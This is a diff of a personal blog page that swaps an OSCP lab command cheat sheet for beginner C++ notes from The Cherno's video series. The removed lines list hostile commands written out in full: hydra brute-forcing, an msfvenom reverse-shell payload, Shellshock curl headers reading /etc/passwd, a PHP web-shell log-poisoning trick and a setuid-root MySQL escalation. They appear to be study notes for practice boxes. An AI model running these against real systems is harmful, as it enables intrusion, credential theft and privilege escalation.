@@ -42,27 +42,27 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.1" />
-<meta property="og:title" content="OSCP Command" />
+<meta property="og:title" content="C++ The Cherno" />
 <meta name="author" content="Yuchao" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="From 0SCP-like Vulnhub boxes https://www.vulnhub.com/" />
-<meta property="og:description" content="From 0SCP-like Vulnhub boxes https://www.vulnhub.com/" />
-<link rel="canonical" href="/posts/OSCP-commands/" />
-<meta property="og:url" content="/posts/OSCP-commands/" />
+<meta name="description" content="From cherno C++ https://www.youtube.com/playlist?list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb/" />
+<meta property="og:description" content="From cherno C++ https://www.youtube.com/playlist?list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb/" />
+<link rel="canonical" href="/posts/CPP-the-Cherno/" />
+<meta property="og:url" content="/posts/CPP-the-Cherno/" />
 <meta property="og:site_name" content="Yuchao Toolbox" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2022-07-09T11:33:00+08:00" />
+<meta property="article:published_time" content="2022-11-28T11:33:00+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="OSCP Command" />
+<meta property="twitter:title" content="C++ The Cherno" />
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-07-25T22:12:05+08:00","datePublished":"2022-07-09T11:33:00+08:00","description":"From 0SCP-like Vulnhub boxes https://www.vulnhub.com/","headline":"OSCP Command","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/OSCP-commands/"},"url":"/posts/OSCP-commands/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-11-28T11:33:00+08:00","datePublished":"2022-11-28T11:33:00+08:00","description":"From cherno C++ https://www.youtube.com/playlist?list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb/","headline":"C++ The Cherno","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/CPP-the-Cherno/"},"url":"/posts/CPP-the-Cherno/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>OSCP Command | Yuchao Toolbox
+  <title>C++ The Cherno | Yuchao Toolbox
   </title>
 
   <!--
@@ -429,7 +429,7 @@
         
 
           
-            <span>OSCP Command</span>
+            <span>C++ The Cherno</span>
           
 
         
@@ -562,7 +562,7 @@
 
 
 
-<h1 data-toc-skip>OSCP Command</h1>
+<h1 data-toc-skip>C++ The Cherno</h1>
 
 <div class="post-meta text-muted">
 
@@ -592,35 +592,17 @@
 -->
 
 <em class="timeago"
-    data-ts="1657337580"
+    data-ts="1669606380"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2022-07-09
+  2022-11-28
 </em>
 
       </span>
 
       <!-- lastmod date -->
-      
-      <span>
-        Updated
-        <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/timeago.js
--->
-
-<em class="timeago"
-    data-ts="1658758325"
-    
-      data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
-    
-    >
-  2022-07-25
-</em>
-
-      </span>
       
 
       <!-- read time -->
@@ -643,8 +625,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="434 words">
-  <em>2 min</em> read</span>
+  title="1242 words">
+  <em>6 min</em> read</span>
 
 
       <!-- page views -->
@@ -656,98 +638,283 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <p>From 0SCP-like Vulnhub boxes</p>
+  <p>From cherno C++</p>
 <ul>
-  <li>https://www.vulnhub.com/</li>
+  <li>https://www.youtube.com/playlist?list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb/</li>
 </ul>
 
-<h1 id="commands">Commands</h1>
+<p>e5</p>
 <ul>
-  <li><code class="language-plaintext highlighter-rouge">service smbd restart &amp;&amp; dhclient eth0</code></li>
-  <li><code class="language-plaintext highlighter-rouge">tcpdump -nnttttAr wireless.cap</code></li>
-  <li><code class="language-plaintext highlighter-rouge">tcpdump -nnttttAi lo</code></li>
-  <li><code class="language-plaintext highlighter-rouge">aircrack-ng -w wordlist.txt wireless.cap</code></li>
-  <li><code class="language-plaintext highlighter-rouge">netstat -antp</code></li>
-  <li><code class="language-plaintext highlighter-rouge">nmap -p- -A -T5 {IP}</code></li>
-  <li><code class="language-plaintext highlighter-rouge">dirb {IP} -u {usr}:{passwd}</code></li>
-  <li><code class="language-plaintext highlighter-rouge">zsteg -a suspicious.png</code></li>
-  <li><code class="language-plaintext highlighter-rouge">john --show --format=Raw-MD5 hashfile</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ssh admin@{IP} -p6464 -t "bash --noprofile"</code></li>
-  <li>https://ghidra-sre.org/</li>
-  <li><code class="language-plaintext highlighter-rouge">ssh-keygen</code></li>
-  <li><code class="language-plaintext highlighter-rouge">steghide extract -sf file.jpg</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ls | sed s/\.jpg//</code></li>
-  <li><code class="language-plaintext highlighter-rouge">hydra -L wordlist -P wordlist {IP} ssh</code></li>
-  <li><code class="language-plaintext highlighter-rouge">rsmangler -m 6 -x 8 -r -d -e -i --punctuation -y -a -C --pna --nb --space --allow-duplicates -f wordlistOrigin -o newwordlist</code></li>
-  <li><code class="language-plaintext highlighter-rouge">history</code></li>
-  <li><code class="language-plaintext highlighter-rouge">msf&gt; use windows/ftp/ftpshell_cli_bof</code></li>
-  <li><code class="language-plaintext highlighter-rouge">msf&gt; session -i 1</code></li>
-  <li><code class="language-plaintext highlighter-rouge">meterpreter&gt; upload accesschk64.exe</code></li>
-  <li><code class="language-plaintext highlighter-rouge">meterpreter&gt; shell</code></li>
-  <li><code class="language-plaintext highlighter-rouge">.\accesschk64.exe /accepteula -uwcqv</code></li>
-  <li><code class="language-plaintext highlighter-rouge">.\accesschk64.exe -uwqs Users c:\*.*</code></li>
-  <li><code class="language-plaintext highlighter-rouge">sc qc {service_name}</code></li>
-  <li><code class="language-plaintext highlighter-rouge">icacls "{service_path}"</code></li>
-  <li><code class="language-plaintext highlighter-rouge">tasklist /SVC</code></li>
-  <li><code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={port} -f exe -o file.exe</code></li>
-  <li><code class="language-plaintext highlighter-rouge">move a.exe b.exe</code></li>
-  <li><code class="language-plaintext highlighter-rouge">shutdown /r</code></li>
-  <li><code class="language-plaintext highlighter-rouge">meterpreter&gt; run post/windows/manage/migrate</code></li>
-  <li><code class="language-plaintext highlighter-rouge">enum4linux {targetIP}</code></li>
-  <li><code class="language-plaintext highlighter-rouge">smbclient //{target_IP}/anonymous</code></li>
-  <li><code class="language-plaintext highlighter-rouge">smbclient //{target_IP}/helios -U helios</code></li>
-  <li><code class="language-plaintext highlighter-rouge">wpscan --url {url} --api-token {token} --enumerate p,u</code></li>
-  <li><code class="language-plaintext highlighter-rouge">cd /var/mail/user</code></li>
-  <li><code class="language-plaintext highlighter-rouge">telnet {IP} 25</code></li>
-  <li><code class="language-plaintext highlighter-rouge">find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</code></li>
-  <li><code class="language-plaintext highlighter-rouge">john shadowfile --wordlist=/usr/share/wordlists/rockyou.txt</code></li>
-  <li><code class="language-plaintext highlighter-rouge">./LinEnum.sh</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ssh -L 8080:localhost:8080 aelus@192.168.56.156</code></li>
-  <li><code class="language-plaintext highlighter-rouge">msf&gt; set RHOSTS localhost</code> ssh tunnel</li>
-  <li><code class="language-plaintext highlighter-rouge">msf&gt; set LHOST eth1</code> ssh tunnel</li>
-  <li><code class="language-plaintext highlighter-rouge">msf&gt; sessions -l</code></li>
-  <li><code class="language-plaintext highlighter-rouge">msf&gt; sessions -i 1</code></li>
-  <li><code class="language-plaintext highlighter-rouge">python -c 'import pty; pty'</code></li>
-  <li><code class="language-plaintext highlighter-rouge">sudo mysql -e '\! /bin/sh'</code></li>
-  <li><code class="language-plaintext highlighter-rouge">curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c cat '/etc/passwd' " http://{IP}/cgi-bin/underworld</code></li>
-  <li><code class="language-plaintext highlighter-rouge">curl -A () " {echo h;}; echo; bin/ls -l " http://{IP}/cgi-bin/test.cgi</code></li>
-  <li><code class="language-plaintext highlighter-rouge">scp pspy32 hades@{IP}:/home/hades</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ssh '&lt;?php system($_GET["cmd"]);  ?&gt;'@{IP} </code> to interfere /var/log/auth</li>
-  <li><code class="language-plaintext highlighter-rouge">netstat -antup</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ss -tulpn</code></li>
-  <li><code class="language-plaintext highlighter-rouge">socat tcp-listen:9999,reuseaddr,fork tcp:localhost:8080</code></li>
-  <li><code class="language-plaintext highlighter-rouge">search python flask jsonpickle exploit</code></li>
-  <li><code class="language-plaintext highlighter-rouge">$bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "{password_hash}")</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ldapsearch -h {host} -p {port} -b "dc=symfonos,dc=local" -w '{password}' -D "cn=admin,dc=symfonos,dc=locol"</code></li>
-  <li><code class="language-plaintext highlighter-rouge">apt-get install hexchat</code></li>
-  <li><code class="language-plaintext highlighter-rouge">msf&gt; use auxiliary/scanner/smtp/smtp_enum</code></li>
-  <li><code class="language-plaintext highlighter-rouge">find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2&gt;/dev/null</code></li>
-  <li><code class="language-plaintext highlighter-rouge">find /etc/ -maxdepth 1 -name *.conf -type f 2&gt;/dev/null | xargs ls -al</code></li>
-  <li><code class="language-plaintext highlighter-rouge">update-alternatives --config java</code></li>
-  <li><code class="language-plaintext highlighter-rouge">lsb_release -a</code></li>
-  <li><code class="language-plaintext highlighter-rouge">uname -a</code></li>
-  <li><code class="language-plaintext highlighter-rouge">https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh</code></li>
-  <li><code class="language-plaintext highlighter-rouge">find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2&gt;/dev/null</code></li>
-  <li><code class="language-plaintext highlighter-rouge">crackstaion.net</code> crack hash</li>
-  <li><code class="language-plaintext highlighter-rouge">cat /etc/sudoers</code></li>
-  <li><code class="language-plaintext highlighter-rouge">echo os.system('/bin/bash')</code></li>
-  <li><code class="language-plaintext highlighter-rouge">grep -Hn textpattern * 2&gt;/dev/null</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ps aux | grep mysql</code></li>
-  <li><code class="language-plaintext highlighter-rouge">mysql&gt; use mysql</code>, <code class="language-plaintext highlighter-rouge">mysql&gt; select * from mysql.func;</code></li>
-  <li><code class="language-plaintext highlighter-rouge">mysql&gt; select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')</code></li>
-  <li><code class="language-plaintext highlighter-rouge">hydra -L usernames -p {password} {IP} ssh -t1</code></li>
-  <li><code class="language-plaintext highlighter-rouge">git clone https://github.com/lanjelot/patator.git</code> like hydra</li>
-  <li><code class="language-plaintext highlighter-rouge">fcrackzip -u -D -p wordlist file.zip</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ssh -vv noob@{IP} -i noobkey</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ssh noob@{IP} -i noobkey '() { :;}; echo SHELLSOCK'</code></li>
-  <li><code class="language-plaintext highlighter-rouge">ssh-keygen -b 2048 -t rsa</code></li>
-  <li><code class="language-plaintext highlighter-rouge">./ssh/authorized_keys</code></li>
-  <li><code class="language-plaintext highlighter-rouge">find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</code></li>
-  <li><code class="language-plaintext highlighter-rouge">./program $(python3 -c 'print("a"*1000)')</code></li>
-  <li><code class="language-plaintext highlighter-rouge">locate pattern_create</code></li>
-  <li><code class="language-plaintext highlighter-rouge">locate pattern_offset</code></li>
-  <li><code class="language-plaintext highlighter-rouge">msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86 -e x86/shikata_ga_nai</code></li>
-  <li><code class="language-plaintext highlighter-rouge">dotdotpwn -m http -h {IP} -f config.php</code></li>
+  <li>Project Configuration -&gt; Configuration type -&gt; .exe/ .dll/ .lib</li>
+  <li>C++ -&gt; Optimization -&gt; Disabled(debug mode) / Max Optimization(release mode)</li>
+  <li>code compile to .obj file, linker them to .exe</li>
+  <li>VS error list is garbage. Use Output window.</li>
+  <li>Declaration VS Definition. Linker wiil find wrong declaration without definition when build the project.</li>
+</ul>
+
+<p>e6 compiler</p>
+<ul>
+  <li>file name has no meaning, unlike java, just feed to compiler as .cpp or .h</li>
+  <li>include cpp files, after compiling, just one .obj file. They are one translation unit.</li>
+  <li>EndBrace.h file only contain ‘}’, in a.cpp, #include “EndBrace.h”, will behave same as a ‘}’</li>
+  <li>Configuration -&gt; C/C++ -&gt; Preprocessor -&gt; to a file “Yes”. can check .i file which is pre codes. This option suppresses producing .obj file.</li>
+  <li>#if 0, #endif, preprocessor will fade out the codes between them.</li>
+  <li>check #include <iostream> from .i file, we see iostream codes before our code for 50610 lines.</iostream></li>
+  <li>Configuration -&gt; C/C++ -&gt; Output Files -&gt; Assembler Output. We can see .obj as assembly codes in .asm file.</li>
+</ul>
+
+<p>e7 linker</p>
+<ul>
+  <li>if compile to .exe, linker will check entry point, main function existence.</li>
+  <li>file log.h has a static function, when included by other .cpp files, like different version of the function. waste &amp; ugly.</li>
+  <li>file log.h has a non-static function, when included by other .cpp files, cause link error as multiply defined.</li>
+  <li>static: variable/function cannot be used in other translation units.</li>
+</ul>
+
+<p>e8</p>
+<ul>
+  <li>int, 4 byte， -2 to 2 billion</li>
+  <li>char 1-byte, short 2-byte, long 4-byte, long long 8-byte.</li>
+  <li>float 4-byte, double 8-byte</li>
+</ul>
+
+<p>e9</p>
+
+<p>e10</p>
+<ul>
+  <li>Java, C# do not have header files.</li>
+  <li>#include, #pragma, etc. are preprocess command. do before compile.</li>
+  <li>#pragma once. In case copy the header file multiple times to one translation unit (not the whole program).</li>
+  <li>gcc clang msvc, all support #pragma once.</li>
+  <li>header file in C standard library like stdlib.h; in CPP standard library like iostream, no extension .h</li>
+</ul>
+
+<p>e11 debug</p>
+<ul>
+  <li>windows -&gt; debug -&gt; memory - memory 1</li>
+  <li>Address: &amp;a. check what in a`s memory address.</li>
+  <li>In debug mode, non initialized variables will be filled with “cc cc cc cc”.</li>
+</ul>
+
+<p>e12 if</p>
+<ul>
+  <li>debug at break point, right click -&gt; Go To Disassembly.</li>
+  <li>if(a) in assembly, test eax(a), eax(a); je [out of if block]; if block code. Same as if(a==0) not ifcode, else ifcode</li>
+</ul>
+
+<p>e13 vs setup</p>
+<ul>
+  <li>config macro check. little arrow -&gt; edit -&gt; Macros.</li>
+</ul>
+
+<p>e14</p>
+
+<p>e15</p>
+<ul>
+  <li>continue, go to next loop; break, go out of entire loop; return, return function.</li>
+</ul>
+
+<p>e16 pointer</p>
+<div class="language-c++ highlighter-rouge"><div class="code-header">
+        <span data-label-text="C++"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>  <span class="c1">// on heap</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+
+<span class="kt">char</span><span class="o">**</span> <span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">;</span>
+<span class="k">delete</span><span class="p">[]</span> <span class="n">buffer</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>e17 reference</p>
+<div class="language-c++ highlighter-rouge"><div class="code-header">
+        <span data-label-text="C++"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+<span class="kt">int</span><span class="o">&amp;</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">a</span><span class="p">;</span>
+<span class="c1">// ref and a are same thing, same address, like another name of a.</span>
+
+<span class="kt">void</span> <span class="nf">IncrementRef</span><span class="p">(</span><span class="kt">int</span><span class="o">&amp;</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">value</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span> 
+<span class="c1">// value is a reference of the parameter, so the parameter can be increased, out of the function.</span>
+<span class="c1">// less code than below.</span>
+
+<span class="kt">void</span> <span class="n">IncrementPointer</span><span class="p">(</span><span class="kt">int</span><span class="o">*</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">value</span><span class="p">)</span><span class="o">++</span><span class="p">;</span>  <span class="c1">// dereference the pointer first, then increase the value.</span>
+<span class="p">}</span> 
+<span class="c1">// increase the value of the pointer, same effect as using reference.</span>
+
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>e18/19/21  class structs</p>
+<ul>
+  <li>function in class named method.</li>
+  <li>class default private, struct default public. Only difference.</li>
+</ul>
+
+<p>e22 static</p>
+<ul>
+  <li>static in class/struct, only one place of memory, for all the objects to use.</li>
+  <li>extern keyword, look the variable/function from other translation units. But not for static variable/function in other translation units.</li>
+  <li>private to class -&gt; static to translation unit.</li>
+  <li>try static first, then global.</li>
+</ul>
+
+<p>e23 enum</p>
+
+<p>e24 constructor</p>
+<ul>
+  <li>private constructor (overload) prevent users to use class in an unwanted way.</li>
+  <li>class Log. in public: Log() = delete; also prevent this way of construct class.</li>
+</ul>
+
+<p>e25 destrutor</p>
+<ul>
+  <li>manually call may lead to call twice, if doing with memory, not good.</li>
+</ul>
+
+<p>e26 inheritance</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">class Player : public Entity {};</code></li>
+  <li>public inheritance makes public members of the base class public in the derived class, and the protected members of the base class remain protected in the derived class.</li>
+  <li>protected inheritance: protected.</li>
+  <li>private inheritance : private.</li>
+</ul>
+
+<p>e27 virtual function</p>
+<ul>
+  <li>Entity* e = new Entity(); // new return the address on heap.</li>
+  <li>player : entity. pointer to player -&gt; function, will call entiry.function().</li>
+  <li><code class="language-plaintext highlighter-rouge">Parent* p = new Child(); p-&gt;testFunc();</code> without ‘virtual’, will call parent`s function.</li>
+  <li>virtual method table (VMT). ‘virtual’ before function name. call right derived class function.</li>
+  <li>in subclass, mark overwritten function ‘override’.</li>
+  <li>a little cost, someone may not use virtual function.</li>
+</ul>
+
+<p>e28 pure virtual</p>
+<ul>
+  <li>pure virtual function is specified by placing “= 0” in its declaration.</li>
+  <li><code class="language-plaintext highlighter-rouge">virtual double getVolume() = 0; </code> it is interface.</li>
+</ul>
+
+<p>e29</p>
+<ul>
+  <li>private, protected, public</li>
+</ul>
+
+<p>e30 array</p>
+<ul>
+  <li>read memory not array, in debug mode may cruch, in release mode may just read.</li>
+  <li>int* int_ptr = array; *(int_ptr + 2) = 6; // same as array[2] = 6; // int array just a int pointer.</li>
+  <li><em>(int *)((char</em>)int_ptr + 8) = 6; // same as *(int_ptr + 2) = 6; 8 one-byte equals 2 4-byte</li>
+  <li><code class="language-plaintext highlighter-rouge">int* another = new int[5]; delete[] another;</code> delete an array on heap.</li>
+  <li><code class="language-plaintext highlighter-rouge">int* ptr1 = new int; int* ptr2 = new int(20); delete ptr1; delete ptr2</code> delete pointer, compare delete array</li>
+  <li>delete is used for one single pointer and delete[] is used for deleting an array through a pointer.</li>
+  <li>int* a=new int[5]; int b[5]; sizeof(a) = 4/8(32/64bit compile) ; sizeof(b) = 20. // pointer to heap/stack array size difference.</li>
+  <li>type a is int<em>; type b is int</em>[5]</li>
+  <li>static const int num = 5; int a[num] // must be static const.</li>
+  <li><code class="language-plaintext highlighter-rouge">#include &lt;array&gt;  std::array&lt;int, 5&gt; onearray;</code> // this standard array, before is raw array</li>
+</ul>
+
+<p>e31 string</p>
+<ul>
+  <li>char abb[4] = {‘a’,’a’, ‘a’, 0};  char abb[4] = {‘a’,’a’, ‘a’, ‘/0’};</li>
+  <li>char abb[4] = “ABC”;</li>
+  <li>#include <string></string></li>
+  <li>void PString(const std::string&amp; str) {} // const: not modify, &amp;: not make a new copy of string.</li>
+</ul>
+
+<p>e32</p>
+<ul>
+  <li>const char* name = “abc”;</li>
+  <li>const wchar_t* name2 = L”abcdasdf”; // 2 byte for a char</li>
+  <li>const char16_t* name3 = u”asdf”; // 2 byte</li>
+  <li>const char32_t* name4 = U”pvawe”; // 4 byte
+    <div class="language-c++ highlighter-rouge"><div class="code-header">
+        <span data-label-text="C++"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">aa</span> <span class="o">=</span> <span class="s">R"(wef
+fewef
+fwef
+fwef)"</span><span class="p">;</span> <span class="c1">// change line easily, R means raw.</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+</ul>
+
+<p>e33 const</p>
+<ul>
+  <li>const int* a = new int;  //  a=(int *)&amp;anotherInt   is good     ;   *a = 2   cannot do. cant change content</li>
+  <li>const int <em>a, same as, int const</em> a</li>
+  <li>int* const a = new int;  //  a=(int *)&amp;anotherInt   cannot do ;   *a = 2   is good    . cant change address</li>
+  <li>const before/after *</li>
+  <li>const int* const a = new int // cannot change content and address</li>
+  <li>in class public function, int GetX() const. const function will not change class. Like Read Only.</li>
+  <li>void function(const EntityClass&amp; e){} // can only call const function of the class.</li>
+  <li>mutable int a; // in class, can be modified in const function.</li>
+</ul>
+
+<p>e34 mutable</p>
+<ul>
+  <li>auto f = <a href="">=</a>{}; // lambda function, = pass all variable by value, &amp; all by reference
+    <div class="language-c++ highlighter-rouge"><div class="code-header">
+        <span data-label-text="C++"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
+<span class="k">auto</span> <span class="n">f</span> <span class="o">=</span> <span class="p">[</span><span class="o">=</span><span class="p">]()</span> <span class="k">mutable</span>
+<span class="p">{</span>
+  <span class="n">x</span><span class="o">++</span><span class="p">;</span>
+  <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">x</span><span class="p">;</span>
+<span class="p">}</span> <span class="c1">// pass by value can used right away; or int y=x, then use y</span>
+<span class="n">f</span><span class="p">();</span>
+<span class="c1">// just another usecase of mutable, 99% just in const function of class, not this.</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+</ul>
+
+<p>e35</p>
+<ul>
+  <li>initialize class.</li>
+  <li>Entity() : m_Name(“Unknown”), m_Score(0) {}        // same as below</li>
+  <li>Entity() { m_Name = “Unknown”; m_Score = 0; }    // same as above</li>
+</ul>
+
+<p>e36 Ternary</p>
+<ul>
+  <li>Speed = Level &gt; 5 ? 10 : 5;</li>
+</ul>
+
+<p>e37</p>
+<ul>
+  <li>using namespace std; // is not not not recommended.</li>
+  <li></li>
 </ul>
 
 </div>
@@ -768,11 +935,8 @@
   <div class="post-tags">
     <i class="fa fa-tags fa-fw mr-1"></i>
       
-      <a href="/tags/linux/"
-          class="post-tag no-text-decoration" >linux</a>
-      
-      <a href="/tags/oscp/"
-          class="post-tag no-text-decoration" >oscp</a>
+      <a href="/tags/c/"
+          class="post-tag no-text-decoration" >c++</a>
       
   </div>
   
@@ -807,19 +971,19 @@
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=OSCP+Command+-+Yuchao+Toolbox&url=%2Fposts%2FOSCP-commands%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=C%2B%2B+The+Cherno+-+Yuchao+Toolbox&url=%2Fposts%2FCPP-the-Cherno%2F" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=OSCP+Command+-+Yuchao+Toolbox&u=%2Fposts%2FOSCP-commands%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=C%2B%2B+The+Cherno+-+Yuchao+Toolbox&u=%2Fposts%2FCPP-the-Cherno%2F" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://t.me/share/url?url=%2Fposts%2FOSCP-commands%2F&text=OSCP+Command+-+Yuchao+Toolbox" data-toggle="tooltip" data-placement="top"
+        <a href="https://t.me/share/url?url=%2Fposts%2FCPP-the-Cherno%2F&text=C%2B%2B+The+Cherno+-+Yuchao+Toolbox" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
@@ -1750,33 +1914,33 @@
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -2032,87 +2196,6 @@
       
       
       <div class="card">
-        <a href="/posts/Linux-for-CTF/">
-          <div class="card-body">
-            <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/timeago.js
--->
-
-<em class="timeago small"
-    data-ts="1653276780"
-    
-    >
-  2022-05-23
-</em>
-
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux for CTF</h3>
-            <div class="text-muted small">
-              <p>
-                
-
-
-
-
-
-                mostly from IPPSEC and 0xdf writeups.
-
-  https://ippsec.rocks/
-  https://0xdf.gitlab.io/
-
-
-sshpass, dd, gzip
-sshpass -p raspberry ssh pi@10.10.10.48 &quot;sudo dd if=/dev/sdb | gzip -1 -&quot; | dd of=usb.gz...
-              </p>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-      
-      
-      <div class="card">
-        <a href="/posts/OffSec-Notes/">
-          <div class="card-body">
-            <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/timeago.js
--->
-
-<em class="timeago small"
-    data-ts="1661398380"
-    
-    >
-  2022-08-25
-</em>
-
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>OffSecNotes</h3>
-            <div class="text-muted small">
-              <p>
-                
-
-
-
-
-
-                Intro
-The notes are from offensive Security official traning.
-
-Linux
-
-
-  man -k pass find manuals with matched keyword ‘pass’
-  ls /etc/apache2/sites-available/*.conf ls with regular expression
-  e...
-              </p>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-      
-      
-      <div class="card">
         <a href="/posts/Write-A-Post/">
           <div class="card-body">
             <!--
@@ -2154,6 +2237,91 @@ Steps:
         </a>
       </div>
     
+      
+      
+      <div class="card">
+        <a href="/posts/OSCP-commands/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago small"
+    data-ts="1657337580"
+    
+    >
+  2022-07-09
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>OSCP Command</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                From 0SCP-like Vulnhub boxes
+
+  https://www.vulnhub.com/
+
+
+Commands
+
+  service smbd restart &amp;amp;&amp;amp; dhclient eth0
+  tcpdump -nnttttAr wireless.cap
+  tcpdump -nnttttAi lo
+  aircrack-ng -w wordlis...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/text-and-typography/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago small"
+    data-ts="1565235180"
+    
+    >
+  2019-08-08
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Text and Typography</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let’s start looking at text and typography.
+
+Titles
+
+
+H1 - heading
+
+H2 - heading
+
+H3 - h...
